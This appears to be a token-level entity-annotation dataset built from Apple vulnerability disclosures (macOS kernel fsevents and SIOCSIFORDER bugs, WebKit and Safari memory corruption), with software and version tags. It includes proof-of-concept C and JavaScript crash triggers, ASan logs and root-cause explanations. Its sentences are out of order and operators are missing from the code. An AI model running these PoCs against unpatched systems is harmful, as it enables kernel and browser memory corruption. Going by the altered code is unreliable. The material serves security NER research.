kernel O O
tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
on O O
MacbookAir5,2 O O
( O O
build O O
with O O
-O3 O O
) O O
The O O
open O O
handler O O
for O O
the O O
fsevents O O
device O O
node O O
has O O
a O O
further O O
access O O
check O O
: O O
if O O
( O O
! O O
kauth_cred_issuser O O
( O O
kauth_cred_get O O
return O O
EPERM O O
; O O
} O O
restricting O O
this O O
issue O O
to O O
root O O
only O O
despite O O
the O O
permissions O O
on O O
the O O
device O O
node O O
( O O
which O O
is O O
world-readable O O
) O O
ianbeer O O
if O O
0 O O
MacOS/iOS O O
kernel O O
double O O
free O O
due O O
to O O
bad O O
locking O O
in O O
fsevents O O
device O O
fseventsf_ioctl O O
handles O O
ioctls O O
on O O
fsevent O O
fds O O
acquired O O
via O O
FSEVENTS_CLONE_64 O O
on O O
/dev/fsevents O O
Heres O O
the O O
code O O
for O O
the O O
FSEVENTS_DEVICE_FILTER_64 O O
ioctl O O
: O O
case O O
FSEVENTS_DEVICE_FILTER_64 O O
: O O
if O O
( O O
! O O
proc_is64bit O O
( O O
vfs_context_proc O O
( O O
ctx O O
) O O
) O O
) O O
{ O O
ret O O
= O O
EINVAL O O
; O O
break O O
; O O
} O O
devfilt_args O O
= O O
( O O
fsevent_dev_filter_args64 O O
) O O
data O O
; O O
handle_dev_filter O O
: O O
{ O O
int O O
new_num_devices O O
; O O
dev_t O O
devices_not_to_watch O O
, O O
tmp=NULL O O
; O O
if O O
( O O
devfilt_args- O O
> O O
num_devices O O
256 O O
) O O
{ O O
ret O O
= O O
EINVAL O O
; O O
break O O
; O O
} O O
new_num_devices O O
= O O
devfilt_args- O O
> O O
num_devices O O
; O O
if O O
( O O
new_num_devices O O
0 O O
) O O
{ O O
tmp O O
= O O
fseh- O O
> O O
watcher- O O
> O O
devices_not_to_watch O O
; O O
< O O
( O O
a O O

Apple S-vulnerable_software pair_0
macOS/iOS S-vulnerable_software pair_0
Kernel S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 O O
) O O
- O O
Double-Free O O
Due O O
to O O
Bad O O
Locking O O
in O O
fsevents O O
Device O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
font O O
file O O
. O O

The O O
issue O O
involves O O
the O O
FontParser O O
component O O
. O O

The O O
issue O O
involves O O
the O O
Security O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
X.509 O O
certificate O O
file O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
libxslt O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
via O O
unknown O O
vectors O O
. O O

( O O
std O O
: O O
:is_same O O
< O O
WebCore O O
: O O
:HTMLDocument O O
, O O
WebCore O O
: O O
:Document O O
> O O
: O O
:value O O
) O O
, O O
WebCore O O
: O O
:JSDOMWrapperConverterTraits O O
< O O
WebCore O O
: O O
:HTMLDocument O O
> O O
: O O
:WrapperClass O O
> O O
: O O
:type O O
WebCore O O
: O O
:createWrapper O O
< O O
WebCore O O
: O O
:HTMLDocument O O
, O O
WebCore O O
: O O
:Document O O
> O O
( O O
WebCore O O
: O O
:JSDOMGlobalObject O O
, O O
WTF O O
: O O
:Ref O O
< O O
WebCore O O
: O O
:Document O O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b6e17 O O
) O O
15 O O
0x115a1457c O O
in O O
WebCore O O
: O O
:createNewDocumentWrapper O O
( O O
JSC O O
: O O
:ExecState O O
& O O
, O O
WebCore O O
: O O
:JSDOMGlobalObject O O
& O O
, O O
WTF O O
: O O
:Ref O O
< O O
WebCore O O
: O O
:Document O O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b657c O O
) O O
16 O O
0x115a14746 O O
in O O
WebCore O O
: O O
:toJS O O
( O O
JSC O O
: O O
:ExecState O O
, O O
WebCore O O
: O O
:JSDOMGlobalObject O O
, O O
WebCore O O
: O O
:Document O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x11b6746 O O
) O O
17 O O
0x115f0dc3a O O
in O O
WebCore O O
: O O
:createWrapper O O
( O O
JSC O O
: O O
:ExecState O O
, O O
WebCore O O
: O O
:JSDOMGlobalObject O O
, O O
WTF O O
: O O
:Ref O O
< O O
WebCore O O
: O O
:Node O O
Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x16afc3a O O
) O O
18 O O
0x1154ddca8 O O
in O O
WebCore O O
: O O
:toJS O O
( O O
JSC O O
: O O
:ExecState O O
, O O
WebCore O O
: O O
:JSDOMGlobalObject O O
, O O
WebCore O O
: O O
:Node O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0xc7fca8 O O
) O O
19 O O
0x115b8e39c O O
in O O
WebCore O O
: O O
:JSDOMWindowBase O O
: O O
:updateDocument O O
( O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x133039c O O
) O O
20 O O
0x116d5dfb1 O O
in O O
WebCore O O
: O O
:ScriptController O O
: O O
:initScript O O
( O O
WebCore O O
: O O
:DOMWrapperWorld O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x24fffb1 O O
) O O
21 O O
0x10d20ba77 O O
in O O
WebCore O O
: O O
:ScriptController O O
: O O
:windowShell O O
( O O
WebCore O O
: O O
:DOMWrapperWorld O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit+0x2eba77 O O

Source O O
: O O
is O O
a O O
use-after-free O O
security O O
vulnerability O O
in O O
WebKit O O
. O O

ASan O O
log O O
: O O
25184 O O
ERROR O O
: O O
AddressSanitizer O O
: O O
heap-use-after-free O O
on O O
address O O
0x61a000076e80 O O
at O O
pc O O
0x000115bea4e0 O O
bp O O
0x7fff52cef2e0 O O
sp O O
0x7fff52cef2d8 O O
READ O O
of O O
size O O
8 O O
at O O
0x61a000076e80 O O
thread O O
T0 O O
0 O O
0x115bea4df O O
in O O
WebCore O O
: O O
:toJS O O
( O O
JSC O O
: O O
:ExecState O O
, O O
WebCore O O
: O O
:JSDOMGlobalObject O O
, O O
WebCore O O
: O O
:EventTarget O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x138c4df O O
) O O
1 O O
0x115bc7b72 O O
in O O
WebCore O O
: O O
:jsEventCurrentTargetGetter O O
( O O
JSC O O
: O O
:ExecState O O
& O O
, O O
WebCore O O
: O O
:JSEvent O O
& O O
, O O
JSC O O
: O O
:ThrowScope O O
& O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1369b72 O O
) O O
2 O O
0x115bc4c06 O O
in O O
long O O
long O O
WebCore O O
: O O
:BindingCaller O O
< O O
WebCore O O
: O O
:JSEvent O O
> O O
: O O
:attribute O O
< O O
& O O
( O O
WebCore O O
: O O
:jsEventCurrentTargetGetter O O
( O O
JSC O O
: O O
:ExecState O O
& O O
, O O
WebCore O O
: O O
:JSEvent O O
& O O
, O O
JSC O O
: O O
:ThrowScope O O
& O O
) O O
) O O
, O O
( O O
WebCore O O
: O O
:CastedThisErrorBehavior O O
) O O
0 O O
> O O
( O O
JSC O O
: O O
:ExecState O O
, O O
long O O
long O O
, O O
char O O
const O O
) O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore+0x1366c06 O O
) O O
3 O O
0x1121bd448 O O
in O O
JSC O O
: O O
:PropertySlot O O
: O O
:customGetter O O
( O O
JSC O O
: O O
:ExecState O O
, O O
JSC O O
: O O
:PropertyName O O
) O O
const O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x1587448 O O
) O O
4 O O
0x111ef652e O O
in O O
llint_slow_path_get_by_id O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12c052e O O
) O O
5 O O
0x111f13926 O O
in O O
llint_entry O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12dd926 O O
) O O
6 O O
0x111f17490 O O
in O O
llint_entry O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12e1490 O O
) O O
7 O O
0x111f10aca O O
in O O
vmEntryToJavaScript O O
( O O
/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x12daaca O O
) O O
8 O O
0x111bca172 O O
in O O
JSC O O
: O O
:JITCode O O
: O O
:execute O O
( O O
JSC O O
: O O
:VM O O
, O O
JSC O O

PoC O O
: O O
< O O
script O O
function O O
freememory O O
( O O
) O O
{ O O
var O O
a O O
; O O
for O O
( O O
var O O
i=0 O O
; O O
i O O
< O O
100 O O
; O O
i++ O O
) O O
{ O O
a O O
= O O
new O O
Uint8Array O O
( O O
1024 O O
1024 O O
function O O
f1 O O
( O O
) O O
{ O O
var O O
iframe O O
= O O
document.getElementById O O
( O O
iframe O O
) O O
; O O
iframe.srcdoc O O
= O O
x O O
; O O
window.frames.event O O
= O O
window.event O O
; O O
freememory O O
( O O
) O O
; O O
} O O
function O O
f2 O O
( O O
) O O
{ O O
var O O
h O O
= O O
new O O
XMLHttpRequest O O
( O O
) O O
; O O
h.onreadystatechange O O
= O O
f1 O O
; O O
h.open O O
( O O
foo O O
, O O
1 O O
) O O
; O O
var O O
e O O
= O O
window.event O O
; O O
e.initEvent O O
( O O
1 O O
, O O
true O O
, O O
true O O
) O O
; O O
e.currentTarget.click O O
script O O
< O O
/head O O
< O O
body O O
onload=f1 O O
( O O
) O O
< O O
iframe O O
id= O O
iframe O O
onload= O O
f2 O O
( O O
) O O
> O O
< O O
/iframe O O
< O O
! O O

Apple O O
WebKit O O
- O O
WebCore O O
: O O
:toJS O O
Use-After-Free O O

tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
on O O
MacbookAir5,2 O O
endif O O
include O O
< O O
stdlib.h O O
include O O
< O O
stdio.h O O
include O O
< O O
unistd.h O O
include O O
< O O
sys/ioctl.h O O
include O O
< O O
sys/socket.h O O
include O O
< O O
mach/mach.h O O
struct O O
if_order O O
{ O O
u_int32_t O O
ifo_count O O
; O O
u_int32_t O O
ifo_reserved O O
; O O
mach_vm_address_t O O
ifo_ordered_indices O O
; O O
array O O
of O O
u_int32_t O O
define O O
SIOCSIFORDER O O
_IOWR O O
( O O
i O O
, O O
178 O O
, O O
struct O O
if_order O O
) O O
int O O
main O O
( O O
) O O
{ O O
uint32_t O O
data O O
[ O O
] O O
= O O
{ O O
0x80001234 O O
} O O
; O O
struct O O
if_order O O
ifo O O
; O O
ifo.ifo_count O O
= O O
1 O O
; O O
ifo.ifo_reserved O O
= O O
0 O O
; O O
ifo.ifo_ordered_indices O O
= O O
( O O
mach_vm_address_t O O
) O O
data O O
; O O
int O O
fd O O
= O O
socket O O
( O O
PF_INET O O
, O O
SOCK_STREAM O O
, O O
0 O O
) O O
; O O
int O O
ret O O
= O O
ioctl O O
( O O
fd O O
, O O
SIOCSIFORDER O O
, O O
& O O
ifo O O
) O O
; O O
return O O
0 O O
; O O
} O O

This O O
leads O O
very O O
directly O O
to O O
memory O O
corruption O O
at O O
( O O
d O O
) O O
which O O
will O O
add O O
the O O
value O O
read O O
out O O
of O O
bounds O O
to O O
a O O
list O O
structure O O
. O O

at O O
( O O
b O O
) O O
this O O
value O O
is O O
cast O O
to O O
a O O
signed O O
type O O
for O O
a O O
bounds O O
check O O
at O O
( O O
c O O
) O O
this O O
value O O
is O O
used O O
as O O
an O O
unsigned O O
index O O
by O O
providing O O
a O O
value O O
with O O
the O O
most-significant O O
bit O O
set O O
making O O
it O O
negative O O
when O O
cast O O
to O O
a O O
signed O O
type O O
we O O
can O O
pass O O
the O O
bounds O O
check O O
at O O
( O O
b O O
) O O
and O O
lead O O
to O O
reading O O
an O O
interface O O
pointer O O
out-of-bounds O O
below O O
the O O
ifindex2ifnet O O
array O O
. O O

it O O
falls O O
through O O
to O O
calling O O
: O O
ifnet_reset_order O O
( O O
ordered_indices O O
, O O
ifo- O O
> O O
ifo_count O O
) O O
where O O
ordered_indicies O O
points O O
to O O
attacker-controlled O O
bytes O O
. O O

ifnet_reset_order O O
contains O O
this O O
code O O
: O O
for O O
( O O
u_int32_t O O
order_index O O
= O O
0 O O
; O O
order_index O O
< O O
count O O
; O O
order_index++ O O
) O O
{ O O
u_int32_t O O
interface_index O O
= O O
ordered_indices O O
[ O O
order_index O O
] O O
; O O
< O O
( O O
a O O
) O O
if O O
( O O
interface_index O O
IFSCOPE_NONE O O
|| O O
( O O
int O O
) O O
interface_index O O
if_index O O
b O O
) O O
break O O
; O O
} O O
ifp O O
= O O
ifindex2ifnet O O
[ O O
interface_index O O
] O O
; O O
< O O
( O O
c O O
) O O
if O O
( O O
ifp O O
NULL O O
) O O
{ O O
continue O O
; O O
} O O
ifnet_lock_exclusive O O
( O O
ifp O O
) O O
; O O
TAILQ_INSERT_TAIL O O
( O O
& O O
ifnet_ordered_head O O
, O O
ifp O O
, O O
if_ordered_link O O
) O O
; O O
< O O
( O O
d O O
) O O
ifnet_lock_done O O
( O O
ifp O O
) O O
; O O
if_ordered_count++ O O
; O O
} O O
at O O
( O O
a O O
) O O
a O O
controlled O O
32-bit O O
value O O
is O O
read O O
into O O
an O O
unsigned O O
32-bit O O
variable O O
. O O

It O O
can O O
be O O
called O O
on O O
a O O
regular O O
tcp O O
socket O O
, O O
so O O
from O O
pretty O O
much O O
any O O
sandbox O O
. O O

tested O O
on O O
MacOS S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 S-vulnerable_version pair_0
) O O
on O O
MacbookAir5,2 O O
( O O
on O O
64-bit O O
platforms O O
the O O
array O O
index O O
wouldn O O
t O O
wrap O O
around O O
so O O
the O O
read O O
would O O
actually O O
occur O O
2GB O O
above O O
the O O
array O O
, O O
not O O
below O O
) O O
ianbeer O O
if O O
0 O O
MacOS/iOS O O
kernel O O
memory O O
corruption O O
due O O
to O O
Bad O O
bounds O O
checking O O
in O O
SIOCSIFORDER O O
socket O O
ioctl O O
SIOCSIFORDER O O
is O O
a O O
new O O
ioctl O O
added O O
in O O
iOS O O
10 O O
. O O

Apple S-vulnerable_software pair_0
macOS/iOS S-vulnerable_software pair_0
Kernel S-vulnerable_software pair_0
10.12.3 S-vulnerable_version pair_0
( O O
16D32 O O
) O O
- O O
SIOCSIFORDER O O
Socket O O
ioctl O O
Memory O O
Corruption O O
Due O O
to O O
Bad O O
Bounds O O
Checking O O

Source O O
: O O
confirmed O O
the O O
PoC O O
crashes O O
the O O
release O O
version O O
of O O
Safari S-vulnerable_software pair_0
10.0.3 S-vulnerable_version pair_0
( O O
12602.4.8 S-vulnerable_version pair_0
) O O
. O O

( O O
It O O
might O O
need O O
to O O
refresh O O
the O O
page O O
several O O
times O O
. O O
) O O

The O O
vulnerability O O
was O O
confirmed O O
on O O
a O O
nightly O O
version O O
of O O
WebKit O O
. O O

The O O
PoC O O
has O O
also O O
been O O
observed O O
to O O
crash O O
Safari S-vulnerable_software pair_0
10.0.2 S-vulnerable_version pair_0
on O O
Mac O O
. O O

A O O
minimal O O
PoC O O
is O O
as O O
follows O O
, O O
and O O
a O O
full O O
PoC O O
is O O
attached O O
. O O

It O O
calls O O
JSArray O O
: O O
:appendMemcpy O O
, O O
which O O
calculates O O
the O O
memory O O
size O O
for O O
the O O
combined O O
arrays O O
as O O
follows O O
: O O
unsigned O O
newLength O O
= O O
startIndex O O
+ O O
otherLength O O
; O O
If O O
startIndex O O
( O O
resultIndex O O
from O O
concatSlowPath O O
in O O
JS O O
) O O
is O O
very O O
large O O
, O O
an O O
integer O O
overflow O O
can O O
occur O O
, O O
causing O O
too O O
small O O
a O O
buffer O O
to O O
be O O
allocated O O
, O O
and O O
copying O O
to O O
occur O O
outside O O
of O O
the O O
buffer O O
. O O

This O O
will O O
cause O O
an O O
undefined O O
Array O O
of O O
the O O
delete O O
length O O
to O O
be O O
allocated O O
, O O
and O O
then O O
returned O O
without O O
it O O
being O O
written O O
to O O
, O O
which O O
would O O
cause O O
it O O
to O O
decide O O
its O O
type O O
. O O

Arrays O O
of O O
type O O
ArrayWithUndecided O O
are O O
usually O O
of O O
length O O
0 O O
, O O
however O O
, O O
it O O
is O O
possible O O
to O O
create O O
one O O
by O O
calling O O
Array.splice O O
on O O
an O O
array O O
with O O
all O O
undefined O O
elements O O
. O O

It O O
should O O
be O O
difficult O O
to O O
reach O O
this O O
state O O
without O O
a O O
long O O
execution O O
time O O
, O O
because O O
an O O
array O O
of O O
length O O
resultIndex O O
needs O O
to O O
be O O
allocated O O
and O O
copied O O
before O O
resultIndex O O
is O O
incremented O O
, O O
however O O
if O O
both O O
arrays O O
involved O O
in O O
the O O
concatenation O O
are O O
of O O
type O O
ArrayWithUndecided O O
JSArray O O
: O O
:appendMemcpy O O
returns O O
true O O
without O O
copying O O
, O O
and O O
resultIndex O O
can O O
be O O
incremented O O
with O O
a O O
low O O
execution O O
time O O
. O O

In O O
builtins/ArrayPrototype.js O O
, O O
the O O
function O O
concatSlowPath O O
calls O O
a O O
native O O
method O O
@ O O
appendMemcpy O O
with O O
a O O
parameter O O
resultIndex O O
that O O
is O O
handled O O
unsafely O O
by O O
the O O
method O O
. O O

Apple O O
Safari O O
- O O
Array O O
concat O O
Memory O O
Corruption O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.6 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
6.2 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

If O O
90 O O
days O O
elapse O O
without O O
a O O
broadly O O
available O O
patch O O
, O O
then O O
the O O
bug O O
report O O
will O O
automatically O O
become O O
visible O O
to O O
the O O
public O O
. O O

With O O
any O O
fix O O
, O O
please O O
give O O
credit O O
for O O
identifying O O
the O O
vulnerability O O
to O O
Ivan O O
Fratric O O
of O O
Google O O
Project O O
Zero O O
. O O

Please O O
note O O
: O O
This O O
bug O O
is O O
subject O O
to O O
a O O
90 O O
day O O
disclosure O O
deadline O O
. O O

This O O
results O O
in O O
negative O O
memmove O O
in O O
WebCore O O
: O O
:HTMLFormElement O O
: O O
:registerFormElement O O
. O O

The O O
vulnerability O O
was O O
confirmed O O
on O O
a O O
nightly O O
build O O
of O O
WebKit O O
. O O

Apple O O
WebKit O O
- O O
Negative-Size O O
memmove O O
in O O
HTMLFormElement O O

Tested O O
on O O
Webkit S-vulnerable_software pair_0
Nightly S-vulnerable_software pair_0
10.0.2 S-vulnerable_version pair_0
( O O
12602.3.12.0.1 S-vulnerable_version pair_0
, O O
r210800 S-vulnerable_version pair_0
) O O

Apple S-vulnerable_software pair_0
WebKit S-vulnerable_software pair_0
10.0.2 S-vulnerable_version pair_0
( O O
12602.3.12.0.1 S-vulnerable_version pair_0
, O O
r210800 S-vulnerable_version pair_0
) O O
- O O
constructJSReadableStreamDefaultReader O O
Type O O
Confusion O O

The O O
PoC O O
also O O
crashes O O
Safari O O
10.0.2 O O
on O O
Mac O O
. O O

The O O
vulnerability O O
was O O
confirmed O O
on O O
the O O
latest O O
nightly O O
build O O
of O O
WebKit O O
. O O

Apple S-vulnerable_software pair_0
